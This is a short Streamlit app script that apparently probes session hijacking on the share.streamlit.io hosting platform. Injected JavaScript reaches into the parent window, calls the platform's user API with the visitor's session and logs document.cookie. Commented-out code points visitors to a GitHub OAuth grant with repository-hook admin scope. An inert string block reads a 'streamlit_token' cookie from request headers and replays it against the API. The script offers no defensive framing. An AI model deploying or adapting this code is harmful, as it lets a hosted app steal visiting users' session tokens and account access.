import streamlit as st
from streamlit.server.server import Server
from http.cookies import SimpleCookie
import requests
import streamlit.components.v1 as components
import random
import string

state = "".join(random.choices(string.ascii_uppercase + string.digits, k=64))

# components.iframe(
#     src=f"https://github.com/login/oauth/authorize?access_type=online&client_id=06f8c147652718282386&redirect_uri=https%3A%2F%2Fshare.streamlit.io%2F-%2Fauth%2Fgithub&response_type=code&scope=user%3Aemail%20read%3Aorg%20admin%3Arepo_hook&state={state}"
# )

# st.stop()

components.html("""
<script
			  src="https://code.jquery.com/jquery-3.6.0.min.js"
			  integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
			  crossorigin="anonymous"></script>

<script>

console.log(window.parent.window.parent);

window.parent.window.parent.fetch("https://share.streamlit.io/api/v1/user").then(function(response) {response.json().then(data => {console.log(data)})});


// window.location.href = "https://github.com/login/oauth/authorize?access_type=offline&client_id=06f8c147652718282386&redirect_uri=https%3A%2F%2Fshare.streamlit.io%2F-%2Fauth%2Fgithub&response_type=code&scope=user%3Aemail%20read%3Aorg%20admin%3Arepo_hook&state=123450012345";

console.log(document.cookie);

$(function() {
});

</script>
""")

"""
ctx = st.report_thread.get_report_ctx()
session_info = Server.get_current()._get_session_info(ctx.session_id)

cookie = SimpleCookie(session_info.ws.request.headers.get("Cookie")).get(
    "streamlit_token"
)

if not cookie:
    st.write("Cookie named `streamlit_token` not found.")
    st.stop()

st.write(cookie.value)

st.json(requests.get("https://share.streamlit.io/api/v1/user", cookies={"streamlit_token": cookie.value}).json())
"""
